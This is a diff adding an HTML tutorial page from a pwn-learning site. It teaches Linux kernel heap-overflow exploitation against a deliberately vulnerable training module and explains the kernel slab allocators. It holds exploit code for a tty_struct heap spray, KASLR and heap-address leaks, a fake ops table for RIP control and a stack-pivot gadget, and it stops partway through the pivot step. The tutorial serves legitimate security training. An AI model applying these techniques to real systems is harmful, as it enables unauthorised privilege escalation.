@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//en/linux-kernel/LK01/heap_overflow.html">
+
+    <meta name="og:title" content="Holstein v2: Exploiting Heap Overflow - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Holstein v2: Exploiting Heap Overflow | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/en/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/en/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/en/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/heap_overflow">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/heap_overflow">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/heap_overflow">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Holstein v2: Exploiting Heap Overflow
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/heap_overflow">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/heap_overflow">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/heap_overflow">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="stack_overflow.html">Previous</a></div>
+            <div class="pagination-index"><a href="../index.html">Contents</a></div>
+            <div class="pagination-fd"><a href="use_after_free.html">Next</a></div>
+        </div>
+    
+    
+        <div class="column" title="Table of Contents">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-analysis-and-vulnerability-survey"><span class="toc-text">Patch analysis and vulnerability survey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Slab-allocators"><span class="toc-text">Slab allocators</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SLAB-allocator"><span class="toc-text">SLAB allocator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SLUB-allocator"><span class="toc-text">SLUB allocator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SLOB-allocator"><span class="toc-text">SLOB allocator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Heap-Overflow"><span class="toc-text">Exploiting Heap Overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-based-exploit"><span class="toc-text">ROP-based exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Confirming-the-heap-overflow"><span class="toc-text">Confirming the heap overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Defeating-KASLR"><span class="toc-text">Defeating KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Defeating-SMAP-controlling-RIP"><span class="toc-text">Defeating SMAP: controlling RIP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Defeating-SMEP-stack-pivot"><span class="toc-text">Defeating SMEP: stack pivot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation"><span class="toc-text">Privilege escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-with-AAR-AAW"><span class="toc-text">Exploiting with AAR&#x2F;AAW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#modprobe-path-and-core-pattern"><span class="toc-text">modprobe_path and core_pattern</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cred-structures"><span class="toc-text">cred structures</span></a></li></ol></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>In the previous chapter, we exploited a Stack Overflow in the Holstein module and escalated privileges. The Holstein developer quickly fixed the bug and released Holstein v2. In this chapter, we exploit the improved Holstein module v2.</p>
+<h2 id="Patch-analysis-and-vulnerability-survey">Patch analysis and vulnerability survey</h2>
+<p>First, download <a href="distfiles/LK01-2.tar.gz">Holstein v2</a>.<br>
+If you inspect the source code in the <code>src</code> directory, you will see that compared with the previous version only <code>module_read</code> and <code>module_write</code> changed.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_read</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(buf, g_buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                            <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Instead of using a stack variable, the module now reads and writes the contents of <code>g_buf</code> directly. Of course, there is still no bounds check, so an overflow remains. This time the vulnerability is a heap overflow.<br>
+<code>g_buf</code> is allocated inside <code>module_open</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);</span><br></pre></td></tr></table></figure>
+<p><code>BUFFER_SIZE</code> is <code>0x400</code>. Let’s see what happens if we write more than that.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If you actually run this program, probably nothing obvious happens, like in the screenshot below.</p>
+<center>
+  <img src="img/hbof_nothing.png" alt="Heap overflow does not immediately crash" style="width:320px;">
+</center>
+<p>So how does the Linux kernel heap actually work?</p>
+<h2 id="Slab-allocators">Slab allocators</h2>
+<p>Like user space, the kernel sometimes needs to allocate dynamic regions smaller than a page. The simplest allocator would be to carve out memory in page-size units like <code>mmap</code>, but that wastes too much memory.<br>
+Just as user space has <code>malloc</code>, kernel space has <code>kmalloc</code>. Internally it uses an allocator built into the kernel, usually one of SLAB, SLUB, or SLOB. These three are not completely independent and share some implementation concepts. Collectively they are called <strong>slab allocators</strong>. The naming is confusing because the difference between Slab and SLAB is only capitalization.</p>
+<p>We will explain each allocator, but only the parts important for exploitation. Just like user-space allocators, the important points are:</p>
+<ul>
+<li>where chunks come from depending on the requested size</li>
+<li>how freed objects are managed and how they get reused by later allocations</li>
+</ul>
+<p>We will look at each allocator with those two points in mind.</p>
+<h3 id="SLAB-allocator">SLAB allocator</h3>
+<p>The SLAB allocator is historically the oldest type. It is used mainly in systems such as Solaris.<br>
+Its main implementation lives in <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slab.c">/mm/slab.c</a>.</p>
+<p>SLAB has the following characteristics:</p>
+<ul>
+<li><strong>Different page frames depending on size</strong><br>
+Unlike libc allocators, different pages are used for different size classes. Therefore chunks do not carry size metadata immediately before or after them.</li>
+<li><strong>Cache usage</strong><br>
+For small sizes, per-size caches are preferred. For large sizes or when the cache is empty, normal allocation is used instead.</li>
+<li><strong>Bitmap-based management of free regions</strong><br>
+Because the page frame differs by size class, the beginning of the page contains a bit array indicating which indices inside that page are free. Unlike libc <code>malloc</code>, it is not managed by linked lists.</li>
+</ul>
+<p>In short, free regions are managed per page frame by index as follows:</p>
+<center>
+  <img src="img/slab_allocator.png" alt="SLAB allocator diagram" style="width:640px;">
+</center>
+<p>In reality there are also some cache entries, and pointers to freed regions recorded there are used first.<br>
+In addition, depending on flags given at cache creation time through <code>__kmem_cache_create</code>, SLAB can provide features such as:</p>
+<ul>
+<li><code>SLAB_POISON</code>: freed regions are filled with <code>0xA5</code></li>
+<li><code>SLAB_RED_ZONE</code>: a redzone is added after objects and corruption from Heap Overflow is detected</li>
+</ul>
+<h3 id="SLUB-allocator">SLUB allocator</h3>
+<p>SLUB is the allocator currently used by default and is designed for large systems. It aims to be as fast as possible.<br>
+Its main implementation lives in <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slub.c">/mm/slub.c</a>.</p>
+<p>SLUB has the following characteristics:</p>
+<ul>
+<li><strong>Different page frames depending on size</strong><br>
+Like SLAB, different page frames are used for different size classes. For example, 100-byte allocations use <code>kmalloc-128</code>, while 200-byte allocations use <code>kmalloc-256</code>. Unlike SLAB, metadata such as free-region indices is not stored at the beginning of the page frame. Pointers such as the head of the freelist are stored in the page-frame descriptor instead.</li>
+<li><strong>Forward-list management of free regions</strong><br>
+Like libc’s tcache and fastbin, SLUB manages free regions with a singly linked list. The beginning of a freed region stores a pointer to the previously freed region, and the link in the last freed region is NULL. There is no special protection like tcache/fastbin link checks.</li>
+<li><strong>Cache usage</strong><br>
+Like SLAB, there are per-CPU caches, but in SLUB they also take the form of singly linked lists.</li>
+</ul>
+<p>In short, free regions are managed like this:</p>
+<center>
+  <img src="img/slub_allocator.png" alt="SLUB allocator diagram" style="width:680px;">
+</center>
+<p>In SLUB, debugging features can be enabled by passing letters to the <code>slub_debug</code> kernel boot parameter.</p>
+<ul>
+<li><code>F</code>: enable sanity checks</li>
+<li><code>P</code>: fill freed regions with a specific bit pattern</li>
+<li><code>U</code>: record allocation and free stack traces</li>
+<li><code>T</code>: log usage of a specific slab cache</li>
+<li><code>Z</code>: add a redzone after objects and detect Heap Overflow</li>
+</ul>
+<p>Including this chapter, the target kernels on this site basically use SLUB. However, because all programs share the same heap, attacks that directly corrupt the freelist are usually not realistic, so this site does not cover them. Most of the techniques we learn later work on the other allocators too.</p>
+<h3 id="SLOB-allocator">SLOB allocator</h3>
+<p>SLOB is an allocator for embedded systems and is designed to be lightweight.<br>
+Its main implementation lives in <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slob.c">/mm/slob.c</a>.</p>
+<p>SLOB has the following characteristics:</p>
+<ul>
+<li><strong>K&amp;R-style allocator</strong><br>
+It works like the classic style of <code>malloc</code>: it carves usable regions from the beginning without fixed size classes. When space runs out, it allocates a new page. As a result, fragmentation happens very easily.</li>
+<li><strong>Offset-based management of free regions</strong><br>
+In glibc, tcache and fastbin manage free regions with lists per size. In SLOB, all freed regions are linked together regardless of size. The links are not stored as direct pointers but as the chunk size and the offset to the next free region. This information is written at the beginning of the freed region. During allocation, the list is traversed until a large enough region is found.</li>
+<li><strong>Freelists based on size</strong><br>
+To reduce fragmentation, there are several lists that group freed objects by size.</li>
+</ul>
+<p>So free regions are managed as a forward list of size and offset information as follows. (The arrows leaving freed regions are offsets rather than real pointers.)</p>
+<center>
+  <img src="img/slob_allocator.png" alt="SLOB allocator diagram" style="width:680px;">
+</center>
+<h2 id="Exploiting-Heap-Overflow">Exploiting Heap Overflow</h2>
+<p>We have now learned that SLUB uses different pages for different sizes and manages freed regions through a singly linked list.</p>
+<p>As explained in the <a href="../introduction/introduction.html">introduction</a>, the kernel heap is shared by all drivers and by the kernel itself. Therefore, by exploiting one vulnerable driver, we can corrupt completely different kernel objects. Because the bug here is a Heap Overflow, successful exploitation requires that some target object we want to corrupt exists immediately after the overflowing region.<br>
+If you are used to exploitation, the obvious tool here is <strong>heap spray</strong>. We use it for two purposes:</p>
+<ol>
+<li>Exhaust the freelist that already exists<br>
+If objects keep being allocated from an existing freelist, we cannot guarantee adjacency to the object we want to corrupt. So we first need to consume the freelist for the target size class.</li>
+<li>Place objects next to each other<br>
+After consuming the freelist, adjacency becomes likely, but depending on the allocator it may not be obvious whether a page is consumed from the front or the back. So we simply fill both sides of the vulnerable object with objects we want to target.</li>
+</ol>
+<p>The next question is the object size. Looking again at Holstein’s source code, the allocated buffer size is clearly <code>0x400</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 0x400</span></span><br></pre></td></tr></table></figure>
+<p><code>0x400</code> corresponds to <code>kmalloc-1024</code>. (You can inspect the system’s slab information through <code>/proc/slabinfo</code>.)<br>
+So the object we can corrupt should basically also be of size <code>0x400</code>. I previously wrote <a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">an article that groups useful objects by size from the attacker’s point of view</a>, so refer to that as well.<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
+<p>In this <code>kmalloc-1024</code> size class, the <code>tty_struct</code> looks useful. <code>tty_struct</code> is defined in <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143"><code>tty.h</code></a> and stores TTY-related state. Its size falls into <code>kmalloc-1024</code>, so this vulnerability lets us read and write out of bounds into it. Let’s look at some of its members.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="type">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>	<span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>Here, <code>tty_operations</code> is a function table defining operations for that TTY.<br>
+By opening <code>/dev/ptmx</code> from a program as follows, a <code>tty_struct</code> is allocated in kernel space.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br></pre></td></tr></table></figure>
+<p>If we then call operations such as <code>read</code>, <code>write</code>, or <code>ioctl</code> on that file descriptor, function pointers from <code>tty_operations</code> are invoked.</p>
+<h2 id="ROP-based-exploit">ROP-based exploit</h2>
+<p>Now that we have all the necessary background, let’s write an exploit for privilege escalation.</p>
+<h3 id="Confirming-the-heap-overflow">Confirming the heap overflow</h3>
+<p>First, let’s use <code>gdb</code> to confirm that a heap overflow is actually happening. To confirm heap spray at the same time, we use code like the following:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> spray[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>)</span><br><span class="line">      fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate in a position surrounded by tty_struct objects</span></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>)</span><br><span class="line">      fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">  getchar(); <span class="comment">// pause</span></span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As usual, disable KASLR, inspect <code>/proc/modules</code>, attach with <code>gdb</code>, and set a breakpoint around the <code>write</code> handler. Since we want to know the address of <code>g_buf</code>, we placed a breakpoint right after the following instruction.</p>
+<center>
+  <img src="img/ida_holstein2_write.png" alt="Where to place the breakpoint" style="width:320px;">
+</center>
+<p>If we inspect the buffer and surrounding memory at that breakpoint, we see a number of similar-looking objects nearby:</p>
+<center>
+  <img src="img/gdb_spray.png" alt="Checking heap spray in gdb" style="width:640px;">
+</center>
+<p>These are exactly the sprayed <code>tty_struct</code> objects. This time we will gain privileges by corrupting one of them through the heap buffer overflow. After the overflow occurs, we can see that the <code>tty_struct</code> immediately after <code>g_buf</code> has indeed been corrupted.</p>
+<center>
+  <img src="img/gdb_tty_bof.png" alt="Corrupting tty_struct" style="width:640px;">
+</center>
+<h3 id="Defeating-KASLR">Defeating KASLR</h3>
+<p>In Holstein v1 we bypassed one mitigation at a time, but this time let’s bypass all of them at once: KASLR, SMAP, SMEP, and KPTI. (Of course, for debugging you should still disable KASLR.)</p>
+<p>This heap buffer overflow is not just a write primitive but also a read primitive, so by reading <code>tty_struct</code> we can defeat KASLR. For example, in the figure above, the pointer at offset <code>0x18</code> from the beginning, namely <code>ops</code>, is clearly a kernel address, so we can compute the base address from it.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ofs_tty_ops 0xc38880</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> kbase;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Defeat KASLR</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  read(fd, buf, <span class="number">0x500</span>);</span><br><span class="line">  kbase = *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x418</span>] - ofs_tty_ops;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase = 0x%016lx\n&quot;</span>, kbase);</span><br></pre></td></tr></table></figure>
+<h3 id="Defeating-SMAP-controlling-RIP">Defeating SMAP: controlling RIP</h3>
+<p>Once we know the kernel base address, it looks as if we should be able to control RIP simply by overwriting the <code>ops</code> function table. In practice, it is not that straightforward. <code>ops</code> is not itself a function pointer but a pointer to a function table, so to control RIP we need it to point to a fake function table.<br>
+If SMAP were disabled, we could prepare that fake table in user space and just write its pointer into <code>ops</code>. But SMAP is enabled here, so the kernel cannot dereference user-space data.</p>
+<p>So how do we bypass SMAP?<br>
+The only place where we can write controlled data in kernel space is the heap, so we need a heap address leak. If we inspect <code>tty_struct</code> in <code>gdb</code>, we can see several pointers that look like heap addresses.</p>
+<center>
+  <img src="img/gdb_tty_struct.png" alt="Inside tty_struct" style="width:640px;">
+</center>
+<p>In particular, the pointer around offset <code>0x38</code> points right into that <code>tty_struct</code> itself.<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> From it we can compute the address of the <code>tty_struct</code>, and subtracting <code>0x400</code> gives the address of <code>g_buf</code>. Since the contents of <code>g_buf</code> are fully controllable, we can place the fake <code>ops</code> table there and then overwrite <code>ops</code> via the heap overflow.<br>
+Once a <code>tty_struct</code> has been overwritten, any suitable operation on it can give us control of RIP. We do not know which of the sprayed <code>tty_struct</code> objects got corrupted, so we perform the operation on all sprayed file descriptors. We also do not know which entry in the function table will be invoked, so we first fill a fake table with marker values and then identify the called entry from the crash message.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Leak g_buf</span></span><br><span class="line">g_buf = *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x438</span>] - <span class="number">0x438</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] g_buf = 0x%016lx\n&quot;</span>, g_buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake function table</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">  *p++ = <span class="number">0xffffffffdead0000</span> + (i &lt;&lt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Control RIP</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0xdeadbeef</span>, <span class="number">0xcafebabe</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If RIP lands as follows, then we have succeeded:</p>
+<center>
+  <img src="img/crash_ioctl.png" alt="RIP control through tty_struct overwrite" style="width:720px;">
+</center>
+<p>In this case we used <code>ioctl</code>, and since the crash happened at <code>0xffffffffdead0c00</code>, we also learn that the function pointer used for <code>ioctl</code> is the 12th entry (<code>0xC</code>).</p>
+<h3 id="Defeating-SMEP-stack-pivot">Defeating SMEP: stack pivot</h3>
+<p>As in the Stack Overflow chapter, once RIP is under control, we can use ROP to bypass SMEP. If SMEP were absent, plain <code>ret2usr</code> would be enough, but to bypass SMEP itself, a gadget such as the following is sufficient:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81516264: mov esp, 0x39000000; ret;</span><br></pre></td></tr></table></figure>
+<p>If we <code>mmap</code> user-space memory at <code>0x39000000</code> in advance and place a ROP chain there, invoking this gadget makes execution pivot to that chain.<br>
+However, SMAP is enabled this time, so a ROP chain placed in user space cannot be executed. Fortunately, we already know the address of a writable kernel-space area, the heap, so we can place the fake function table and the ROP chain together on the heap and execute it there.</p>
+<p>To execute a heap-based ROP chain, we need to move the stack pointer <code>rsp</code> to a heap address. Earlier we used:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(spray[i], <span class="number">0xdeadbeef</span>, <span class="number">0xcafebabe</span>);</span><br></pre></td></tr></table></figure>
